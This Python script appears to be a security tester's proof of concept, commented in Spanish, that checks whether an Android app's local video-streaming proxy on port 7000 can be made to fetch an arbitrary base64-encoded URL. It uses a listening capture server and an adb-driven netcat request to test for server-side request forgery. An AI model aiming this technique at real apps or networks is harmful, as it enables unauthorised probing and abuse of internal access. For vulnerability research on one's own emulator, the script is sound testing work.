import socket, threading, base64, subprocess, time, os, sys

ADB = r"C:\Users\UsuarioLocal\Documents\Android\platform-tools\adb.exe"
SERIAL = "emulator-5554"
PORT = 8099

captured = []


def handle(conn, addr):
    try:
        conn.settimeout(10)
        data = b""
        while b"\r\n\r\n" not in data and len(data) < 8192:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        captured.append(data.decode("utf-8", "replace"))
        body = b"#EXTM3U\n#EXT-X-TARGETDURATION:10\n#EXTINF:10.0,\n0000.ts\n"
        resp = (b"HTTP/1.1 200 OK\r\nContent-Type: application/vnd.apple.mpegurl\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        conn.sendall(resp)
    except Exception as e:
        captured.append(f"ERROR: {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", PORT))
srv.listen(5)
print(f"[*] Servidor de captura escuchando en 0.0.0.0:{PORT}")
threading.Thread(target=lambda: [handle(*srv.accept()) for _ in iter(int, 1)], daemon=True).start()

# Objetivo que el proxy deberia descargar: nuestro servidor (10.0.2.2 = host desde el emulador)
target = f"http://10.0.2.2:{PORT}/test.m3u8"
src = base64.b64encode(target.encode()).decode()
url = f"http://127.0.0.1:7000/resource.m3u8?src={src}"

req = (f"GET /resource.m3u8?src={src} HTTP/1.1\r\nHost: 127.0.0.1:7000\r\n"
       f"User-Agent: ExoPlayerLib/1.5.1 (Linux; Android 12)\r\nAccept: */*\r\nConnection: close\r\n\r\n")
tmp = os.path.join(os.environ["TEMP"], "req_capture.txt")
with open(tmp, "w", encoding="ascii", newline="") as f:
    f.write(req)
subprocess.run([ADB, "-s", SERIAL, "push", tmp, "/data/local/tmp/req_capture.txt"],
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print(f"[*] Pidiendo al proxy local que descargue: {target}")
r = subprocess.run([ADB, "-s", SERIAL, "shell", "nc -w 20 127.0.0.1 7000 < /data/local/tmp/req_capture.txt"],
                   capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=90)
print("--- Respuesta del proxy local ---")
print((r.stdout or "")[:800])

time.sleep(2)
print()
print("=== PETICIONES RECIBIDAS POR NUESTRO SERVIDOR ===")
if not captured:
    print("(ninguna: el proxy no llamo a nuestro destino)")
for c in captured:
    print("-" * 70)
    print(c)
srv.close()
